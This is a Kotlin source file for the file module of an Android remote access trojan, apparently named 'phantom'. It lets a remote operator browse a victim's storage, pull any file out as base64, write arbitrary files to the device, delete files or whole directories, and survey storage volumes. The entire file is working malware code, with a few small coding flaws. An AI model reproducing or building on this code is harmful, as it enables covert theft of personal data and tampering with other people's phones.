package com.phantom.rat.modules

import android.content.Context
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.OpenableColumns
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.text.SimpleDateFormat
import java.util.*

class FileModule(private val context: Context) {

    fun listFiles(path: String): JSONObject {
        val result = JSONObject()
        
        try {
            val dir = File(path)
            if (!dir.exists()) {
                result.put("status", "error")
                result.put("message", "Path does not exist: $path")
                return result
            }
            
            if (!dir.isDirectory) {
                result.put("status", "error")
                result.put("message", "Path is not a directory")
                return result
            }
            
            val files = JSONArray()
            val children = dir.listFiles() ?: return result.apply {
                put("status", "error")
                put("message", "Cannot read directory")
            }
            
            children.forEach { file ->
                val entry = JSONObject().apply {
                    put("name", file.name)
                    put("path", file.absolutePath)
                    put("is_dir", file.isDirectory)
                    put("size", file.length())
                    put("size_formatted", formatFileSize(file.length()))
                    put("last_modified", file.lastModified())
                    put("last_modified_formatted", 
                        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                            .format(Date(file.lastModified())))
                    put("can_read", file.canRead())
                    put("can_write", file.canWrite())
                    put("hidden", file.isHidden)
                }
                
                if (file.isDirectory) {
                    // Count children
                    val subFiles = file.listFiles()
                    put("children_count", subFiles?.size ?: 0)
                } else {
                    put("extension", file.extension)
                }
                
                files.put(entry)
            }
            
            result.put("status", "success")
            result.put("path", path)
            result.put("count", files.length())
            result.put("parent", dir.parentFile?.absolutePath ?: "")
            result.put("total_size", children.sumOf { it.length() })
            result.put("files", files)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Unknown error")
        }
        
        return result
    }

    fun downloadFile(path: String): JSONObject {
        val result = JSONObject()
        
        try {
            val file = File(path)
            if (!file.exists()) {
                result.put("status", "error")
                result.put("message", "File not found: $path")
                return result
            }
            
            if (file.isDirectory) {
                result.put("status", "error")
                result.put("message", "Cannot download a directory")
                return result
            }
            
            val bytes = file.readBytes()
            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            
            result.put("status", "success")
            result.put("path", path)
            result.put("name", file.name)
            result.put("size", file.length())
            result.put("data_b64", b64)
            result.put("mime_type", getMimeType(file.name))
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Failed to read file")
        }
        
        return result
    }

    fun uploadFile(path: String, content: String): JSONObject {
        val result = JSONObject()
        
        try {
            val file = File(path)
            val parent = file.parentFile
            
            if (parent != null && !parent.exists()) {
                parent.mkdirs()
            }
            
            val bytes = Base64.decode(content, Base64.NO_WRAP)
            file.writeBytes(bytes)
            
            result.put("status", "success")
            result.put("path", path)
            result.put("size", bytes.size)
            result.put("message", "File uploaded successfully")
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Failed to upload file")
        }
        
        return result
    }

    fun deleteFile(path: String): JSONObject {
        val result = JSONObject()
        
        try {
            val file = File(path)
            if (!file.exists()) {
                result.put("status", "error")
                result.put("message", "File not found")
                return result
            }
            
            val success = if (file.isDirectory) {
                file.deleteRecursively()
            } else {
                file.delete()
            }
            
            if (success) {
                result.put("status", "success")
                result.put("message", "Deleted: $path")
                result.put("size", file.length())
            } else {
                result.put("status", "error")
                result.put("message", "Failed to delete: $path")
            }
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Failed to delete file")
        }
        
        return result
    }

    fun getStorageInfo(): JSONObject {
        val result = JSONObject()
        
        try {
            val storages = JSONArray()
            
            // Internal storage
            val internalStorage = Environment.getExternalStorageDirectory()
            val internalStat = StatFs(internalStorage.absolutePath)
            
            storages.put(JSONObject().apply {
                put("type", "internal")
                put("path", internalStorage.absolutePath)
                put("total", internalStat.totalBytes)
                put("free", internalStat.freeBytes)
                put("used", internalStat.totalBytes - internalStat.freeBytes)
                put("total_formatted", formatFileSize(internalStat.totalBytes))
                put("free_formatted", formatFileSize(internalStat.freeBytes))
            })
            
            // External SD card
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val storageManager = context.getSystemService(Context.STORAGE_SERVICE) 
                    as android.os.storage.StorageManager
                val volumes = storageManager.storageVolumes
                volumes.forEach { volume ->
                    try {
                        val dir = volume.directory
                        if (dir != null && dir.absolutePath != internalStorage.absolutePath) {
                            val stat = StatFs(dir.absolutePath)
                            storages.put(JSONObject().apply {
                                put("type", "external")
                                put("path", dir.absolutePath)
                                put("total", stat.totalBytes)
                                put("free", stat.freeBytes)
                                put("used", stat.totalBytes - stat.freeBytes)
                                put("total_formatted", formatFileSize(stat.totalBytes))
                                put("free_formatted", formatFileSize(stat.freeBytes))
                                put("removable", volume.isRemovable)
                            })
                        }
                    } catch (_: Exception) {}
                }
            }
            
            result.put("status", "success")
            result.put("storages", storages)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message)
        }
        
        return result
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> String.format(Locale.US, "%.1f KB", bytes / 1024.0)
            bytes < 1024L * 1024 * 1024 -> String.format(Locale.US, "%.1f MB", bytes / (1024.0 * 1024))
            else -> String.format(Locale.US, "%.1f GB", bytes / (1024.0 * 1024 * 1024))
        }
    }

    private fun getMimeType(fileName: String): String {
        val ext = fileName.substringAfterLast('.', "").lowercase()
        return when (ext) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "mp4" -> "video/mp4"
            "3gp" -> "video/3gp"
            "mp3" -> "audio/mpeg"
            "wav" -> "audio/wav"
            "pdf" -> "application/pdf"
            "doc", "docx" -> "application/msword"
            "xls", "xlsx" -> "application/vnd.ms-excel"
            "txt" -> "text/plain"
            "zip" -> "application/zip"
            "apk" -> "application/vnd.android.package-archive"
            else -> "application/octet-stream"
        }
    }

    class StatFs(path: String) {
        private val stat = android.os.StatFs(path)
        val totalBytes: Long get() = stat.blockCountLong * stat.blockSizeLong
        val freeBytes: Long get() = stat.availableBlocksLong * stat.blockSizeLong
    }
}
